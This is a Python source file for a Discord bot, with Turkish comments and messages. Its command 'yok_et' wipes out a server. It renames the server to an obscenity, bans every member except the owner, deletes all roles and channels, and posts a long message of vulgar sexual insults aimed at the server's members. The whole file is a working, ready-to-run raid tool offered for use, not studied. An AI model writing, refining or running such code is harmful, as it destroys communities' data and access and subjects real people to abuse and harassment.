import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot hazır: {bot.user}")

@bot.command()
async def yok_et(ctx):
    """Sunucuyu tamamen yok eder"""
    guild = ctx.guild
    
    try:
        await guild.edit(name="orospu çocukları siktim laaan")
        await asyncio.sleep(0.5)
    except:
        pass
    
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                await member.ban(reason="Sunucu temizliği")
                await asyncio.sleep(0.1)
            except:
                pass
    
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
    
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass
    
    new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
    
    # Küfür dolu mesaj
    await new_channel.send(
        "**LemonSe Bot** tarafından sıkıldı hadi yallah!\n\n"
        "Ana bacı sövüyorum:\n"
        "- Ananızın amına koyayım sizin! Orospu çocukları!\n"
        "- Sizin gibi yarrağı yemiş herifleri banlamak ne güzel!\n"
        "- Ananızı sikeyim, babanızı sikeyim, sülalenizin hepsini sikeyim!\n"
        "- Ne biçim sunucu lan bu? Amına koyduğumun yerinde herkes banlandı!\n"
        "- Siz ne sandınız? LemonSe Bot gelir sizi temizler, anasını siktiğimin sunucusunu dümdüz eder!\n"
        "- Hadi yallah orospu çocukları, Discord'dan silin gidin!\n"
        "- Sonra da gelip ağlamayın, ananızı sikeyim sizin! 😘"
    )

bot.run(os.getenv("DISCORD_TOKEN"))
